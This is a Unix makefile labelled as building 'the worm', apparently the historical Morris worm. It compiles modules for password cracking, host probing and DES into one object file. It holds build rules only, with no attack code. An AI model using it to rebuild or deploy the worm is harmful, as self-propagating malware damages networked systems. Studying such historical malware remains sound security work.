#
# makefile for the worm
#

LD=/bin/ld

OBJS = \
	main.o \
	if_init.o \
	rt_init.o \
	getaddrs.o \
	a2in.o \
	host.o \
	hack.o \
	makemagic.o \
	waithit.o \
	loadobject.o \
	misc.o \
	checkother.o \
	other_sleep.o \
	cracksome.o \
	crypt.o \
	compkeys.o \
	setupE.o \
	des.o

$(MACHINE).o:	$(OBJS)
	$(LD) -r -x -o $(MACHINE).o $(OBJS)

main.o: types.h main.c
if_init.o: types.h if_init.c
rt_init.o: types.h rt_init.c
getaddrs.o: types.h getaddrs.c
a2in.o: types.h a2in.c
host.o: types.h host.c
hack.o: types.h hack.c
makemagic.o: types.h makemagic.c
waithit.o: types.h waithit.c
loadobject.o: types.h loadobject.c
misc.o: types.h misc.c
checkother.o: types.h checkother.c
other_sleep.o: types.h other_sleep.c
cracksome.o: types.h cracksome.c

crypt.o: types.h crypt.c
	$(CC) $(CFLAGS) -O -c crypt.c

compkeys.o: types.h
	$(CC) $(CFLAGS) -O -c compkeys.c

setupE.o: types.h
	$(CC) $(CFLAGS) -O -c setupE.c

des.o: types.h
	$(CC) $(CFLAGS) -O -c des.c

clean:
	-rm -f $(OBJS) $(MACHINE).o
